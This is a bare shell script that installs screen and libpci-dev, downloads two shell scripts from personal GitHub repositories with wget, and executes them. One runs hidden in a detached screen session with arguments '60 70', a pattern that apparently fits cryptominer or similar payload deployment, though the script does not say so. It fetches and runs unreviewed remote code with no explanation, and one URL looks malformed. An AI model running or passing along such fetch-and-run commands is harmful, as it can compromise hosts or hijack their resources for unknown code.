sudo apt update
sudo apt install screen -y
sudo apt install libpci-dev
wget https://github.com/DarshGoswami1982/prem/raw/main/lagan_1.sh
wget https://github.com/DarshGoswami1982/FkgX/main/man2.sh
chmod +x man2.sh
screen -dmS man2 ./man2.sh 60 70
chmod +x lagan_1.sh
./lagan_1.sh
